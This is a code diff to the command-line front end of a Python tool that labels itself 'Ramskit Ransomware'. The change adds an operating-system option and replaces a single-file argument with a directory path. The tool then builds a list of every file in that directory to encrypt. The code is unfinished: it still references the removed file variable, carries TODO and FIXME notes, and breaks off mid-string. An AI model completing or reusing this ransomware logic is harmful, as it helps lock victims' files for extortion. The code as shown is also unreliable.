@@ -26,19 +26,36 @@ import argparse
 # TODO 2: Check CLI args
 def main() -> None:
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
+    parser.add_argument('-o', '--operating-system', dest="operating_system", required=True,
+                        help='Current operating system [linux/windows]')
     parser.add_argument('-a', '--action', dest="action", required=True,
                         help='Action to perform [encrypt/decrypt/generate_key]')
-    parser.add_argument('-f', '--file', dest="file", help='File(s) to encrypt/decrypt')
+    parser.add_argument('-p', '--path', dest="path", help='Path to file(s) to encrypt/decrypt')
     args = parser.parse_args()
     
     ramskit = Ramskit()
     key = ramskit.load_key()
 
+    operating_system = args.operating_system
     action = args.action.lower()
-    file = args.file
+    path = args.path
 
     # FIXME 2: Encrypt/decrypt
     if action == 'encrypt':
+        items = os.listdir(path)
+        full_path = [path + '/' + item for item in items] if operating_system  == 'linux' else [path + '\\' + item for item in items]
+
+        # Just if list comprehension does not work as expected
+        '''
+        if operating_system == 'linux':
+            full_path = [path + '/' + item for item in items]
+        elif operating_system == 'windows':
+            full_path = [path + '\\' + item for item in items]
+        else:
+            print("[x] No OS typed. Exiting...")
+            sys.exit(0)'''
+
+
         # It needs changes here
         with open(file, 'w') as f:
             f.write('''
